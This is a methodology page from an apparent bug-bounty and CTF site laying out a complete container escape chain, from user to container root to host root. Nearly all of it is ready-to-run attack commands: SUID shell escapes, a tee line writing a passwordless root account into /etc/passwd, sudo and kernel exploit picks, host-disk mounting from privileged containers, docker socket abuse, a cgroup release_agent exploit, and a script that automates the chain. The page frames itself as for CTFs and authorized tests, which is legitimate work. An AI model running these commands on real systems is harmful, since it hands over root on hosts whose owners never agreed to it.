---
layout: page
title: "2026 Methodology: Container Escape"
subtitle: "Complete attack chain for container environments — User to Host Root"
permalink: /bugbounty/methodology/2026/container-escape/
---

## Container Escape & Privilege Escalation Methodology (2026)

A structured methodology for attacking containerized environments in CTF challenges and authorized penetration tests. Covers the complete chain from initial user access to host root.

<div style="background:rgba(124,58,237,0.08);border-left:4px solid var(--accent-primary);border-radius:0 8px 8px 0;padding:1rem;margin:1rem 0;">
<strong>📖 Full Technical Write-up:</strong> <a href="{{ '/posts/container-escape-arsenal/' | relative_url }}">Container Escape Arsenal — Complete Attack Chain</a><br>
<strong>🛠️ Toolkit:</strong> <a href="https://github.com/vulnquest58/container-escape-arsenal" target="_blank">container-escape-arsenal on GitHub</a>
</div>

---

## Phase 1: User → Container Root

### Step 1 — Environment Check

```bash
whoami && id
cat /proc/1/cgroup | head -3   # Detect container type
ls /.dockerenv 2>/dev/null && echo "Docker"
capsh --print 2>/dev/null      # Check capabilities
```

### Step 2 — SUID Binaries

```bash
find / -perm -4000 -type f 2>/dev/null
# Use: scripts/suid_exploit.sh for automated hints
```

**Common exploitable SUIDs:**

| Binary | Command |
|--------|---------|
| `find` | `find / -exec /bin/sh -p \; -quit` |
| `vim` | `vim -c ':!/bin/sh'` |
| `less` | Open then type `!/bin/sh` |
| `tee` | `echo 'root::0:0:root:/root:/bin/sh' \| tee -a /etc/passwd` |
| `bash` | `bash -p` |

### Step 3 — Sudo

```bash
sudo -l
# NOPASSWD: ALL → sudo su -
# CVE-2021-3156 → sudoedit -s '/' (segfault = vulnerable)
```

### Step 4 — Kernel Exploits

```bash
uname -r
# 5.8 – 5.16 → Dirty Pipe (CVE-2022-0847)
# < 4.x     → Dirty Cow (CVE-2016-5195)
```

---

## Phase 2: Container Escape

### Decision Tree

```
Is /dev writable?
├── YES → privileged_escape.sh (mount host)
└── NO  → Is /var/run/docker.sock present?
          ├── YES → docker_socket_escape.sh
          └── NO  → Check CAP_SYS_ADMIN
                    ├── YES → cgroup_escape.sh (CVE-2022-0492)
                    └── NO  → Check runc version
                              └── Vulnerable? → runc CVE PoC
```

### Privileged Container (Most Common)

```bash
[ -w /dev ] && echo "PRIVILEGED"
mkdir /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host /bin/bash
```

### Docker Socket

```bash
[ -S /var/run/docker.sock ] && echo "Socket found"
docker run -it --rm --privileged -v /:/host alpine chroot /host /bin/bash
```

### cgroup Release Agent (CVE-2022-0492)

```bash
mkdir /tmp/cg && mount -t cgroup -o rdma cgroup /tmp/cg
echo 1 > /tmp/cg/notify_on_release
echo "/bin/bash -c 'chmod 4777 /bin/bash'" > /tmp/cg/release_agent
mkdir /tmp/cg/child && echo $$ > /tmp/cg/child/cgroup.procs
```

---

## Phase 3: Host User → Host Root

```bash
# Priority order:
sudo -l                       # 1. Sudo NOPASSWD
groups | grep docker          # 2. Docker group
[ -w /etc/passwd ]            # 3. Writable passwd
find /etc/cron* -writable     # 4. Writable cron
showmount -e localhost        # 5. NFS no_root_squash
```

---

## Toolkit Reference

```bash
git clone https://github.com/vulnquest58/container-escape-arsenal.git
chmod +x container-escape-arsenal/scripts/*.sh

# Full automated chain
./container-escape-arsenal/scripts/ctf_escape_pro.sh
```

---

### 🔗 Navigation

- [Full Technical Write-up]({{ '/posts/container-escape-arsenal/' | relative_url }})
- [Writeup Entry]({{ '/bugbounty/writeups/container-escape-ctf/' | relative_url }})
- [Return to 2026 Methodology]({{ '/bugbounty/methodology/2026/' | relative_url }})
- [Return to Bugbounty]({{ '/bugbounty/' | relative_url }})
